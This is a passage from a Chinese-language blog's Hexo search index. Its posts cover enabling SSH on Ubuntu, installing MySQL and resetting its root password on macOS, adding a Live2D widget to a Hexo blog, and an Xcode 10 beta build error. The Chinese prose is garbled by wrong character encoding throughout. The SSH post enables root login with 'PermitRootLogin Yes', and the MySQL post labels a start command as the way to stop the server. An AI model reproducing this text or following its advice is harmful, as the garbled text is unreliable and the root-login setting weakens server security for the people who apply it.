æ›´æ–°ç³»ç»Ÿçš„åŒ…ç®¡ç†å·¥å…·ï¼Œapt-getæ˜¯Linuxè‡ªå¸¦çš„åŒ…ç®¡ç†å·¥å…·ï¼Œç±»ä¼¼äºŽMacç³»ç»Ÿçš„homebrew. 1sudo apt-get update ç§»é™¤ç³»ç»Ÿè‡ªå¸¦çš„vim 1sudo apt-get remove vim-common ä¸‹è½½å®‰è£…æ–°çš„vim 1sudo apt-get install vim æ›´å¤švimç›¸å…³çš„çŸ¥è¯†ä¼ é€é—¨ sshè¿œç¨‹è¿žæŽ¥ å› ä¸ºæˆ‘ä»¬éœ€è¦ç›´æŽ¥åœ¨æœ¬åœ°ç”µè„‘è¿œç¨‹è®¿é—®æœåŠ¡å™¨å¦‚æˆ‘ä»¬çš„è™šæ‹ŸæœºUbuntuç³»ç»Ÿã€ä¼ è¾“æ–‡ä»¶ç­‰ï¼Œæ­¤æ—¶å°±éœ€è¦å¼€å¯sshæœåŠ¡ï¼Œlinuxä¸åŒäºŽMacç³»ç»Ÿï¼Œé»˜è®¤æ˜¯æ²¡æœ‰å®‰è£…sshæœåŠ¡çš„ï¼Œéœ€è¦æˆ‘ä»¬è‡ªè¡Œä¸‹è½½å®‰è£…ã€‚ å®‰è£…sshæœåŠ¡ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š 1sudo apt-get install openssh-server ç¡®è®¤ssh-serveræ˜¯å¦å¯åŠ¨ å¦‚æžœå­˜åœ¨ssh-agentå’Œsshdè¯´æ˜Žå·²ç»å¼€å¯æˆåŠŸ 1ps -e | grep ssh å¦‚æžœæ²¡æœ‰sshdï¼Œéœ€è¦æ‰‹åŠ¨å¯åŠ¨ 1sudo /etc/init.d/ssh start ssh-serveré»˜è®¤ç«¯å£æ˜¯22ï¼Œå¯ä»¥é€šè¿‡SSHé…ç½®æ–‡ä»¶æ›´æ”¹åŒ…æ‹¬ç«¯å£ã€æ˜¯å¦å…è®¸rootç™»å½•ç­‰è®¾ç½®, é…ç½®æ–‡ä»¶ç›®å½•å¦‚ä¸‹ï¼Œä¿®æ”¹å®Œæˆé‡å¯ssh-serverå³å¯ã€‚ 12345678// é…ç½®æ–‡ä»¶ç›®å½•/etc/ssh/sshd_config// å¯é€šè¿‡vimä¿®æ”¹sudo vi /etc/ssh/sshd_config// é‡å¯sudo /etc/init.d/ssh restart å…³äºŽæ›´å¤šsshè¿œç¨‹è¿žæŽ¥ä»¥åŠè¿œç¨‹scpæ–‡ä»¶ä¼ è¾“ï¼Œå¯ä»¥å‚è€ƒä¹‹å‰å†™çš„è¿™ç¯‡æ–‡ç« çš„SSHéƒ¨åˆ† è¿œç¨‹ç™»å½•æŠ¥é”™ åœ¨æœ¬åœ°è¿œç¨‹ç™»å½•linux æœåŠ¡å™¨ç³»ç»Ÿæ—¶ï¼Œæç¤ºPermission denied, please try again. ã€‚ åŽŸå› ï¼šsshæœåŠ¡é»˜è®¤æ²¡æœ‰å¼€rootç”¨æˆ·çš„sshæƒé™ã€‚æ‰€ä»¥è¿œç¨‹ç™»å½•æ—¶é»˜è®¤ä¸‹rootç”¨æˆ·æ˜¯æ²¡æœ‰æƒé™çš„ã€‚ è§£å†³æ–¹æ³•ï¼šè¦ä¿®æ”¹rootçš„sshæƒé™ å°†/etc/ssh/sshd_configæ–‡ä»¶ä¸­PermitRootLogin prohibit-passwordæ³¨é‡ŠæŽ‰ï¼ˆå‰é¢åŠ #å·ï¼‰ã€‚ æ·»åŠ  PermitRootLogin Yes 1sudo vi /etc/ssh/sshd_config æ˜¾ç¤ºéšè—æ–‡ä»¶ è‹¥ä½¿ç”¨æ¡Œé¢å¯è§†åŒ–çª—å£ï¼Œè¿›å…¥è¯¥å¾…æ˜¾ç¤ºçš„æ–‡ä»¶ç›®å½•ï¼Œå¿«æ·é”®ctrl + håˆ™æ˜¾ç¤ºéšè—æ–‡ä»¶ã€‚ è‹¥ä½¿ç”¨å‘½ä»¤è¡Œï¼Œåˆ™ä½¿ç”¨å‘½ä»¤ï¼šls -aæ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶ï¼Œä¹ŸåŒ…æ‹¬éšè—æ–‡ä»¶ã€‚ å‚è€ƒ Parallels Tools manual installation in Linux virtual machine Macä½¿ç”¨parallels desktopå®‰è£… ubuntu åˆ†è¾¨çŽ‡é—®é¢˜]]></content>
      <categories>
        <category>æœåŠ¡å™¨</category>
      </categories>
      <tags>
        <tag>æœåŠ¡å™¨</tag>
        <tag>Swift</tag>
        <tag>Linux</tag>
        <tag>Parallels Desktop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Swiftå¼€å‘æœåŠ¡ç«¯ï¼ˆä¸€ï¼‰ï¼šMySQLå®‰è£…åŠé…ç½®]]></title>
    <url>%2Farchives%2F6efe8aae.html</url>
    <content type="text"><![CDATA[ç»è¿‡è®¸å¤šä¸ªå†¬å¤©ä¹‹åŽï¼Œæˆ‘æ‰æ¸æ¸æ˜Žç™½è‡ªå·±å†èº²ä¸è¿‡é›ªï¼Œæ— è®ºæˆ‘èœ·ç¼©åœ¨å±‹å­é‡Œï¼Œè¿˜æ˜¯è¿œåœ¨å†¬å¤©çš„å¦ä¸€ä¸ªåœ°æ–¹ï¼Œçº·çº·æ‰¬æ‰¬çš„é›ªï¼Œéƒ½ä¼šè½åœ¨æˆ‘æ­£ç»åŽ†çš„ä¸€æ®µå²æœˆé‡Œã€‚å½“ä¸€ä¸ªäººçš„å²æœˆåƒè’é‡Žä¸€æ ·æ•žå¼€æ—¶ï¼Œä»–ä¾¿æ— æ³•ç…§ç®¡å¥½è‡ªå·±ï¼Œè½åœ¨ä¸€ä¸ªäººä¸€ç”Ÿä¸­çš„é›ªï¼Œæˆ‘ä»¬ä¸èƒ½å…¨éƒ¨çœ‹è§ï¼Œæ¯ä¸ªäººéƒ½åœ¨è‡ªå·±çš„ç”Ÿå‘½ä¸­ï¼Œå­¤ç‹¬åœ°è¿‡å†¬ã€‚ â€”â€”åˆ˜äº®ç¨‹ã€Šå¯’é£Žå¹å½»ã€‹ ç®€ä»‹ æœ€è¿‘æƒ³é‡æ–°æŠ˜è…¾ä¸€ä¸‹Swiftçš„æœåŠ¡ç«¯å¼€å‘ï¼Œä¸ºä»€ä¹ˆè¯´æ˜¯é‡æ–°æŠ˜è…¾å‘¢ï¼Ÿå› ä¸ºæˆ‘åœ¨å¹´åˆï¼ˆå¤§æ¦‚æ˜¯1æœˆä»½ï¼‰çš„æ—¶å€™å°±å·²ç»æŠ˜è…¾è¿‡äº†ï¼Œç…§ç€åˆ«äººçš„æ•™ç¨‹ä½“éªŒäº†ä¸€ä¸‹Swiftå¼€å‘æœåŠ¡ç«¯ï¼Œä½¿ç”¨çš„æ˜¯åŠ æ‹¿å¤§çš„ä¸€ä¸ªå¼€å‘å°ç»„å­µåŒ–çš„å¼€æºæœåŠ¡ç«¯æ¡†æž¶Perfectã€‚ ä½†æ˜¯ï¼Œä½“éªŒå®Œå°±å°˜å°äº†ï¼Œä¸€å¦‚ä¹‹å‰çš„Swiftå­¦ä¹ ï¼Œé—´æ­‡æ€§çš„ðŸ˜‚ã€‚è€Œä¸”é‚£æ—¶å€™è¿˜æ²¡çœŸæ­£ç”¨Swiftå¼€å‘è¿‡é¡¹ç›®ï¼Œæ‰€ä»¥å¯¹ä¸€äº›Swiftçš„é«˜çº§è¯­æ³•å’Œç‰¹æ€§è¿˜ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œæ‰€ä»¥ï¼Œè¿™ä¸ªé”…æ˜¯Swiftçš„ï¼Œæˆ‘ä¸èƒŒðŸŒšðŸŒšã€‚ æœ€è¿‘çªç„¶æƒ³æ¢ä½“éªŒä¸€ä¸‹å…¶ä»–ç«¯çš„å¼€å‘æ€è·¯ï¼Œå—¯ã€æ˜¯çš„ï¼Œå¾ˆçªç„¶ðŸŒã€‚æ‰€ä»¥å°±æƒ³æŠŠä¸€äº›å­¦ä¹ è®°å½•å’Œè¸©å‘è¿‡ç¨‹è®°å½•ä¸‹æ¥ã€‚ å› ä¸ºæˆ‘ä¹‹å‰å·²ç»å®‰è£…è¿‡Macç«¯çš„MySQLï¼Œä½†æ˜¯è¿˜æ˜¯æƒ³åœ¨è¿™é‡Œæ€»ç»“è®°å½•ä¸€ä¸‹ã€‚ æ­£æ–‡ MySQLå®‰è£…å¯ä»¥ç›´æŽ¥åŽ»å®˜ç½‘ä¸‹è½½å®‰è£…åŒ…ä¸‹è½½ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨homebrewå®‰è£…ï¼Œä½†æ˜¯æˆ‘å®žåœ¨æ˜¯è®°ä¸èµ·æˆ‘ä¹‹å‰æ˜¯ç”¨å“ªä¸€ç§æ–¹å¼å®‰è£…çš„äº†ã€‚ä¸è¿‡ï¼Œé‰´äºŽæˆ‘è¿™ä¹ˆæ‡’ï¼Œåº”è¯¥æ˜¯ä½¿ç”¨çš„homebrewðŸ¤£ðŸ¤ªã€‚ ä½†æ˜¯è¿™é‡Œã€ä¸¤ç§å®‰è£…æ–¹å¼æˆ‘éƒ½ä¼šä»‹ç»ã€‚ æ‰‹åŠ¨å®‰è£…ä¸‹è½½å®‰è£…MySQL é¦–å…ˆåŽ»MySQLå®˜ç½‘ä¸‹è½½å®‰è£…åŒ…ã€‚ æˆªæ­¢ç›®å‰æœ€æ–°ç‰ˆæœ¬æ˜¯MySQL Community Server 8.0.12ï¼Œä½†æ˜¯åŽé¢ä½¿ç”¨Perfectå¼€å‘çš„æ—¶å€™ï¼Œ8.0.12ä¼šå‡ºçŽ°é—®é¢˜ï¼Œæ‰€ä»¥æŽ¨èä½¿ç”¨5.7.23 ä¸‹è½½5.7.23ç‰ˆæœ¬æ­¥éª¤å¦‚ä¸‹ï¼š ä¸‹è½½å®ŒæˆåŽï¼ŒåŒå‡»æ‰“å¼€è¿›è¡Œå®‰è£…ï¼ŒæŒ‰æ­¥éª¤ä¸€æ­¥ä¸€æ­¥çš„å®‰è£…å³å¯ã€‚ æ³¨æ„æœ€åŽä¸€æ­¥ï¼Œä¼šæœ‰ä¸€ä¸ªå¼¹æ¡†ï¼Œé‡Œé¢æœ‰é»˜è®¤ç”Ÿæˆçš„éšæœºå¯†ç ï¼Œè®°å¾—ä¿å­˜ï¼ŒåŽé¢ä¼šç”¨åˆ°ã€‚ å¯†ç åœ¨ï¼šroot@localhost:xxxxxxxx æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ æ‰“å¼€ç³»ç»Ÿåå¥½è®¾ç½®ï¼Œæœ€ä¸‹é¢ä¼šå‡ºçŽ°MySQLå›¾æ ‡ å¼€å¯MySQLæœåŠ¡ åœ¨ç»ˆç«¯æŸ¥çœ‹MySQLç‰ˆæœ¬ 12345// cmdmysql --version// messagemysql Ver 14.14 Distrib 5.7.21, for osx10.12 (x86_64) using EditLine wrapper MySQLé…ç½® &amp; ç™»å½•ç³»ç»ŸçŽ¯å¢ƒå˜é‡é…ç½® è¿›å…¥cd /usr/local/mysql/binç›®å½• æ‰§è¡Œ ls -lï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨mysqlæ–‡ä»¶ã€‚ ä½¿ç”¨vimç¼–è¾‘bash_profileæ–‡ä»¶ï¼Œå‘½ä»¤ï¼švim ~/.bash_profileã€‚ åœ¨è¯¥æ–‡ä»¶ä¸­æ·»åŠ mysql/binçš„ç›®å½•ï¼ŒæŒ‰iè¿›å…¥ç¼–è¾‘æ¨¡å¼ï¼ŒåŠ å…¥å¦‚ä¸‹å†…å®¹ï¼š 1export PATH=$&#123;PATH&#125;:/usr/local/mysql/bin æ·»åŠ å®ŒæˆåŽï¼ŒæŒ‰escé€€å‡ºç¼–è¾‘æ¨¡å¼ï¼Œç„¶åŽè¾“å…¥ :wqä¿å­˜å¹¶é€€å‡ºvim æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œä½¿æ–°æ·»åŠ çš„çŽ¯å¢ƒå˜é‡æœ‰æ•ˆï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š 1source ~/.bash_profile ç™»å½•MySQL å‚è€ƒä¸Šé¢æ­¥éª¤ï¼Œè¿›å…¥ç³»ç»Ÿåå¥½è®¾ç½®ï¼Œå¼€å¯MySQLæœåŠ¡ ç»ˆç«¯æ‰§è¡Œmysql -uroot -pæŒ‡ä»¤ï¼Œä¼šæç¤ºè¾“å…¥å¯†ç ï¼Œå¯†ç å°±æ˜¯å®‰è£…æ˜¯ä¿å­˜çš„å¯†ç ï¼Œè¾“å…¥å³å¯ã€‚ ä¸€åˆ‡é¡ºåˆ©å°±å¯ä»¥ç™»å½•æˆåŠŸäº†ã€‚ é€šè¿‡Homebrewå®‰è£… ä½¿ç”¨homebrewå®‰è£…å°±æ›´ç®€å•äº†ï¼Œæ‡’äººå¿…å¤‡ï¼Œå®‰è£…homebrewå‚è€ƒè¿™é‡Œã€‚ å®‰è£…mysql 1brew install mysql å®‰è£…å®ŒæˆæŸ¥çœ‹ç‰ˆæœ¬ 12345// cmdmysql --version// messagemysql Ver 14.14 Distrib 5.7.21, for osx10.12 (x86_64) using EditLine wrapper å¼€å¯mysqlæœåŠ¡ 1mysql.server start å®‰è£…å®Œrootç”¨æˆ·é»˜è®¤æ²¡æœ‰å¯†ç ï¼Œéœ€è¦é…ç½®rootç”¨æˆ·å¯†ç æé«˜å®‰å…¨æ€§ã€‚ è®¾ç½®rootç”¨æˆ·å¯†ç  åˆ é™¤åŒ¿åè´¦å· å–æ¶ˆrootç”¨æˆ·è¿œç¨‹ç™»å½• åˆ é™¤teståº“å’Œå¯¹teståº“çš„è®¿é—®æƒé™ åˆ·æ–°æŽˆæƒè¡¨ä½¿ä¿®æ”¹ç”Ÿæ•ˆ 12// å®‰è£…å®‰å…¨é…ç½®å‘å¯¼mysql_secure_installation 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364Securing the MySQL server deployment.Connecting to MySQL using a blank password.VALIDATE PASSWORD PLUGIN can be used to test passwordsand improve security. It checks the strength of passwordand allows the users to set only those passwords which aresecure enough. Would you like to setup VALIDATE PASSWORD plugin?Press y|Y for Yes, any other key for No: yThere are three levels of password validation policy: // å¯†ç å®‰å…¨ç­–ç•¥LOW Length &gt;= 8MEDIUM Length &gt;= 8, numeric, mixed case, and special charactersSTRONG Length &gt;= 8, numeric, mixed case, special characters and dictionary filePlease enter 0 = LOW, 1 = MEDIUM and 2 = STRONG: 0Please set the password for root here.New password: // Rootç”¨æˆ·å¯†ç Re-enter new password: // ç¡®è®¤Rootç”¨æˆ·å¯†ç Estimated strength of the password: 50 Do you wish to continue with the password provided?(Press y|Y for Yes, any other key for No) : yBy default, a MySQL installation has an anonymous user,allowing anyone to log into MySQL without having to havea user account created for them. This is intended only fortesting, and to make the installation go a bit smoother.You should remove them before moving into a productionenvironment.Remove anonymous users? (Press y|Y for Yes, any other key for No) : ySuccess.Normally, root should only be allowed to connect from'localhost'. This ensures that someone cannot guess atthe root password from the network.Disallow root login remotely? (Press y|Y for Yes, any other key for No) : ySuccess.By default, MySQL comes with a database named 'test' thatanyone can access. This is also intended only for testing,and should be removed before moving into a productionenvironment.Remove test database and access to it? (Press y|Y for Yes, any other key for No) : y - Dropping test database...Success. - Removing privileges on test database...Success.Reloading the privilege tables will ensure that all changesmade so far will take effect immediately.Reload privilege tables now? (Press y|Y for Yes, any other key for No) : ySuccess.All done! ç™»å½•mysql 1mysql -uroot ä¿®æ”¹MySQLå¯†ç  å®‰è£…ç”Ÿæˆçš„å¯†ç æ˜¯éšæœºç”Ÿæˆçš„å­—ç¬¦ä¸²ï¼Œæˆ‘è¿žè‡ªå·±è®¾ç½®çš„å¯†ç éƒ½è®°ä¸ä½äº†ï¼Œè¿˜TMè®°è¿™ä¸ªå¯†ç ðŸŒšã€‚ å¦‚æžœè®°å¾—åˆå§‹å¯†ç  å¦‚æžœè¿˜æ²¡æœ‰å¿˜è®°åˆå§‹å¯†ç ï¼Œé‚£ä¹ˆæ­å–œä½ ï¼Œä¿®æ”¹å¾ˆç®€å•ã€‚ æ‰§è¡Œmysql -uroot -pæŒ‡ä»¤ï¼Œè¾“å…¥é»˜è®¤å¯†ç ç™»å½•MySQLã€‚ newPasswordä¸ºæ–°å¯†ç ï¼Œç›´æŽ¥ä¿®æ”¹å³å¯ã€‚ 1SET PASSWORD FOR 'root'@'localhost' = PASSWORD('newPassword'); å¦‚æžœå¿˜è®°åˆå§‹å¯†ç  ä¿®æ”¹å¯†ç æ­¥éª¤å¦‚ä¸‹ï¼š å…³é—­mysqlæœåŠ¡ï¼Œå¯ä»¥åœ¨ç³»ç»Ÿåå¥½è®¾ç½®å…³é—­ï¼Œä¹Ÿå¯ä»¥åœ¨ç»ˆç«¯æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š 1sudo /usr/local/mysql/support-files/mysql.server start è¿›å…¥mysqlç›®å½• 1cd /usr/local/mysql/bin/ èŽ·å–ç®¡ç†å‘˜æƒé™ 1sudo su ç¦æ­¢mysqléªŒè¯åŠŸèƒ½ï¼Œmysqlä¼šè‡ªåŠ¨é‡å¯ï¼Œåå¥½è®¾ç½®ä¸­çš„mysqlçŠ¶æ€ä¼šå˜æˆrunning 1./mysqld_safe --skip-grant-tables &amp; æ–°å¼€ä¸€ä¸ªç»ˆç«¯çª—å£ï¼Œè¿›å…¥mysqlç›®å½• 1cd /usr/local/mysql/bin/ è¾“å…¥å¦‚ä¸‹ä¸¤ä¸ªæŒ‡ä»¤æ‰§è¡Œå¹¶åˆ·æ–° 12./mysqlflush privileges; // åˆ†å·ä¸è¦å¿˜äº† ä¿®æ”¹æ–°å¯†ç  1set password for 'root'@'localhost' = password('newPassword'); å‚è€ƒ Assigning Account Passwords]]></content>
      <categories>
        <category>æœåŠ¡å™¨</category>
      </categories>
      <tags>
        <tag>æœåŠ¡å™¨</tag>
        <tag>Swift</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å…³äºŽHexoåšå®¢åŠ è½½Live2DåŠ¨ç”»æ¨¡åž‹æŒ‚ä»¶]]></title>
    <url>%2Farchives%2Fcb206c67.html</url>
    <content type="text"><![CDATA[è®¸å¤šå¹´ä¹‹åŽä½ å†çœ‹ï¼Œéª‘å¿«é©¬é£žå¥”çš„äººå’Œååœ¨ç‰›èƒŒä¸Šæ…¢æ‚ æ‚ èµ¶è·¯çš„äººï¼Œä¸€æ ·è€æ€é¾™é’Ÿå›žåˆ°æ‘åº„é‡Œï¼Œä»–ä»¬è¡°è€çš„é€Ÿåº¦æ˜¯ä¸€æ ·çš„ã€‚æ—¶é—´æ‰ä¸ç®¡è°è·‘å¾—å¤šå¿«å¤šæ…¢å‘¢ã€‚ â€”â€”åˆ˜äº®ç¨‹ã€Šä¸€ä¸ªäººçš„æ‘åº„ã€‹ ç®€ä»‹ æœ€è¿‘æœ‰å‡ ä½åšå‹é—®æˆ‘å…³äºŽHexoåšå®¢åŠ è½½åŠ¨ç”»æŒ‚ä»¶çš„é—®é¢˜ï¼Œä»–ï¼ˆå¥¹ï¼‰ä»¬å¯èƒ½æ˜¯ç”±äºŽä¸çŸ¥é“è¿™ä¸ªåŠŸèƒ½æ˜¯ç”¨Live2Då®žçŽ°çš„ï¼Œè¦ä¸ç„¶éšä¾¿ç½‘ä¸Šä¸€æœã€æ•™ç¨‹å¯èƒ½ä¸€å¤§æŠŠã€‚ æ—¢ç„¶æœ‰è¿™ä¹ˆå°ä¼™ä¼´é—®ï¼Œé‚£ä¹ˆå­˜åœ¨å°±æ˜¯åˆç†çš„ã€æ‰€ä»¥å°±å•ç‹¬å†™ä¸€ç¯‡æ–‡ç« ç®€å•ä»‹ç»ä¸€ä¸‹æ€Žä¹ˆå®žçŽ°è¿™ä¸ªåŠŸèƒ½ã€‚ æœ¬æ–‡åŸºäºŽHexoåšå®¢çš„Nextä¸»é¢˜ï¼ˆå…¶ä»–ä¸»é¢˜ä¹Ÿéƒ½å¤§åŒå°å¼‚ï¼Œå¯ä»¥å‚è€ƒï¼‰ã€‚ Live2Dçš„å·¥ä½œåŽŸç†æ˜¯é€šè¿‡å°†ä¸€ç³»åˆ—çš„2Då›¾åƒè¿›è¡Œå¹³ç§»ã€æ—‹è½¬å’Œå˜å½¢ç­‰æ“ä½œï¼Œç”Ÿæˆä¸€ä¸ªå…·æœ‰è‡ªç„¶åŠ¨ç”»æ•ˆæžœçš„å¯åŠ¨äººç‰©æ¨¡åž‹ã€‚ç”±äºŽLive2Dåªéœ€ä¸€ç³»åˆ—2DåŽŸå›¾å³å¯ç”Ÿæˆå…·æœ‰ç±»ä¼¼äºŽ3DåŠ¨ç”»æ•ˆæžœçš„æ¨¡åž‹ï¼Œæ¯”3Då»ºæ¨¡è€—è´¹çš„æ—¶é—´å’Œæˆæœ¬æ›´å°‘ï¼Œå› æ­¤å—åˆ°å¾ˆå¤šæ¸¸æˆåˆ¶ä½œè€…ï¼Œç‰¹åˆ«æ˜¯å°æˆæœ¬AVGå’Œæ‰‹æ¸¸ä½œè€…çš„å–œçˆ±ã€‚å¦å¤–ï¼ŒLive2Dç”Ÿæˆçš„æ¨¡åž‹ç›¸å¯¹äºŽçœŸæ­£çš„3Dæ¨¡åž‹ï¼Œå¯ä»¥æ›´å¥½åœ°è¿˜åŽŸæ‰‹ç»˜é£Žæ ¼ã€‚Live2Dç”Ÿæˆçš„æ¨¡åž‹å¹¶ä¸æ˜¯çœŸæ­£çš„3Dæ¨¡åž‹ï¼Œå› æ­¤å…·æœ‰ä¸€äº›å±€é™æ€§ï¼Œæ¯”å¦‚æ— æ³•è¿›è¡Œå¤§å¹…åº¦çš„è½¬èº«åŠ¨ä½œã€‚ä½†æ˜¯è²Œä¼¼Live2D Euclidå¯ä»¥è¾¾åˆ°è¿™ä¸€æ•ˆæžœã€‚ å®‰è£… &amp; éƒ¨ç½²å®‰è£…Live2Dæ¨¡å— ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤å®‰è£…Live2Dæ¨¡å—ã€æ³¨æ„éœ€è¦åœ¨åšå®¢çš„æ ¹ç›®å½•é€šè¿‡ç»ˆç«¯æ‰§è¡Œ 1npm install --save hexo-helper-live2d å¦‚æžœä¸æƒ³ä½¿ç”¨ã€æƒ³å½»åº•å¸è½½ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š 1npm uninstall hexo-helper-live2d å®‰è£…å®Œæˆä¹‹åŽï¼Œå°±ä¼šåœ¨åšå®¢çš„æ ¹ç›®å½•package.jsonæ–‡ä»¶ä¸­å­˜åœ¨ä¾èµ– åœ¨åšå®¢æ ¹ç›®å½•çš„node_moduelsæ–‡ä»¶å¤¹ä¸‹å¯ä»¥çœ‹åˆ°å®‰è£…çš„Live2Dæ¨¡å— äº†è§£æ›´å¤šå¯å‚è€ƒgithub å’Œ å®˜ç½‘ é…ç½®å–œæ¬¢çš„åŠ¨ç”»æ¨¡åž‹ æœ‰éžå¸¸å¤šçš„Live2DåŠ¨ç”»æ¨¡åž‹ä¾›æˆ‘ä»¬é€‰æ‹©ï¼š åŠ¨ç”»æ¨¡åž‹æ•ˆæžœå¯ä»¥å‚è€ƒè¿™é‡Œ å¯¹åº”çš„æ¨¡å—ä¸‹è½½åœ¨è¿™é‡Œ å¦‚æˆ‘ä½¿ç”¨çš„æ˜¯tororoï¼Œå¯ä»¥ç›´æŽ¥åœ¨ä¸Šé¢çš„ä¸‹è½½ç•Œé¢: æ‰‹åŠ¨ä¸‹è½½å®Œæˆä¹‹åŽå°†packagesé‡Œé¢çš„æ‰€æœ‰æ–‡ä»¶æ‹·è´åˆ°åšå®¢æ ¹ç›®å½•çš„node_moduelsæ–‡ä»¶å¤¹ä¸‹ã€‚ ä¹Ÿå¯ä»¥ä½¿ç”¨åŒ…ç®¡ç†å™¨å®‰è£…ï¼Œå‘½ä»¤æ ¼å¼ï¼šnpm install æ¨¡åž‹çš„åŒ…åï¼Œä¹Ÿä¼šå®‰è£…åœ¨node_moduelsç›®å½•ä¸‹ã€‚ é…ç½®åšå®¢çš„ç«™ç‚¹æ–‡ä»¶ æ‰“å¼€åšå®¢æ ¹ç›®å½•çš„é…ç½®æ–‡ä»¶_config.ymlï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š 12345678910111213141516171819202122# Live2D## https://github.com/xiazeyu/live2d-widget.js## https://l2dwidget.js.org/docs/class/src/index.js~L2Dwidget.html#instance-method-initlive2d: model: scale: 1 hHeadPos: 0.5 vHeadPos: 0.618 use: live2d-widget-model-tororo // ä¸‹è½½çš„åŠ¨ç”»æ¨¡åž‹åç§° display: superSample: 2 width: 120 height: 200 position: left // æ¨¡åž‹åœ¨ç½‘é¡µæ˜¾ç¤ºä½ç½® hOffset: 20 vOffset: 50 mobile: show: true // ç§»åŠ¨è®¾å¤‡æ˜¯å¦æ˜¾ç¤º scale: 0.5 react: opacityDefault: 0.7 opacityOnHover: 0.2 éƒ¨ç½²åˆ°ç½‘ç«™ æ‰€æœ‰å·¥ä½œå®Œæˆä¹‹åŽï¼Œå°±å¯ä»¥åœ¨è‡ªå·±çš„ç½‘ç«™éƒ¨ç½²å¹¶æ˜¾ç¤ºå‡ºæ¥äº†ã€‚ æ¸…ç©ºä¸€ä¸‹æœ¬åœ°ç¼“å­˜hexo clean ç”Ÿæˆåšå®¢çš„æ–‡ä»¶ hexo g æˆåŠŸåŽå°±å¯ä»¥åœ¨ç»ˆç«¯çœ‹åˆ°æœ‰å¦‚ä¸‹ä¿¡æ¯ï¼š å°†æ–‡ä»¶æäº¤åˆ°GitHubä»“åº“å¹¶å¼€å§‹éƒ¨ç½²hexo dï¼Œè‡³æ­¤åˆ·æ–°ä½ çš„ç½‘ç«™ï¼Œå°±å¯ä»¥åœ¨æ–‡ç« é¡µé¢çœ‹åˆ°ä½ é…ç½®çš„Live2DåŠ¨ç”»æŒ‚ä»¶äº†ã€‚ å‘å¸ƒè‡ªå·±çš„Live2Dæ¨¡åž‹åŒ… å¦‚æžœä½ æƒ³å‘å¸ƒè‡ªå·±çš„Live2DåŠ¨ç”»æ¨¡åž‹åŒ…ï¼Œå¯ä»¥å‚è€ƒå¦‚ä¸‹æ­¥éª¤ï¼š æ–°å»ºä¸€ä¸ªç›®å½•, ç”¨NodeçŽ¯å¢ƒæ‰§è¡Œ npm init, åŒ…åæŽ¨èæ ¼å¼å¦‚ï¼šlive2d-widget-model-xxxã€‚ åœ¨åˆšåˆšåˆ›å»ºçš„ç›®å½•ä¸‹åˆ›å»º assets å­ç›®å½•, æŠŠä½ çš„æ¨¡åž‹æ–‡ä»¶æ”¾è¿›åŽ». æ‰§è¡Œ npm publish å‘½ä»¤æ¥å‘å¸ƒ. æ­¤æ—¶å°±ä½¿ç”¨ npm install --save live2d-widget-model-xxx æ¥å®‰è£…è‡ªå®šä¹‰çš„æ¨¡åž‹åŒ…äº†ã€‚ å®‰è£…å®ŒæˆåŽå°±å¯ä»¥åœ¨é…ç½®æ–‡ä»¶_config.ymlä¸­ model.use ä¿®æ”¹åŒ…åæ¥ä½¿ç”¨äº†. å‚è€ƒ github å®˜ç½‘]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>Blog</tag>
        <tag>Hexo</tag>
        <tag>live2D</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ä¹‹Xcode10 Beta3å‡çº§Beta4ç¼–è¯‘é”™è¯¯]]></title>
    <url>%2Farchives%2Ffeadc9a.html</url>
    <content type="text"><![CDATA[æˆ‘åªæ„¿è“¬å‹ƒç”Ÿæ´»åœ¨æ­¤æ—¶æ­¤åˆ»ï¼Œæ— æ‰€è°“åŽ»å“ªï¼Œæ— æ‰€è°“è§è°ã€‚é‚£äº›æˆ‘å°†è¦åŽ»çš„åœ°æ–¹ï¼Œéƒ½æ˜¯æˆ‘ä»Žæœªè°‹é¢çš„æ•…ä¹¡ã€‚ä»¥å‰æ˜¯ä»¥å‰ï¼ŒçŽ°åœ¨æ˜¯çŽ°åœ¨ã€‚æˆ‘ä¸èƒ½é€‰æ‹©æ€Žä¹ˆç”Ÿï¼Œæ€Žä¹ˆæ­»ï¼›ä½†æˆ‘èƒ½å†³å®šæ€Žä¹ˆçˆ±ï¼Œæ€Žä¹ˆæ´»ã€‚ â€”â€”çŽ‹å°æ³¢ã€Šé»„é‡‘æ—¶ä»£ã€‹ ç®€ä»‹ ä»Šå¤©å‡çº§äº†ä¸‹Xcode10çš„æœ€æ–°æµ‹è¯•ç‰ˆæœ¬ï¼Œçªç„¶æ­£åœ¨è¿›è¡Œçš„é¡¹ç›®æ— æ³•ç¼–è¯‘äº†ï¼Œè¿™å¯çœŸæ˜¯æ—¥äº†ðŸ¶äº†ã€‚ æˆ‘åˆšå¼€æ˜¯ä»¥ä¸ºæ˜¯æˆ‘é¡¹ç›®æ”¹åŠ¨å‡ºé—®é¢˜äº†ï¼Œ ç„¶åŽåˆ‡åˆ°Xcode9ï¼Œç¼–è¯‘ï¼ŒæˆåŠŸé€šè¿‡ã€‚ å†åˆ‡æ¢åˆ°Xcode10ï¼Œå°†ç¼–è¯‘å™¨ï¼ˆXcode10é»˜è®¤ä¸ºæ–°ç¼–è¯‘å™¨ï¼‰åˆ‡æ¢ä¸ºæ—§ç‰ˆæœ¬ç¼–è¯‘å™¨ï¼Œç¼–è¯‘ï¼ŒæˆåŠŸé€šè¿‡ã€‚ å°†ç¼–è¯‘å™¨åˆ‡æ¢ä¸ºæ–°ç¼–è¯‘å™¨æ¸…ç©ºç¼–è¯‘ç¼“å­˜ï¼Œæ¸…ç†é¡¹ç›®ç¼“å­˜ï¼Œä¾ç„¶æ— 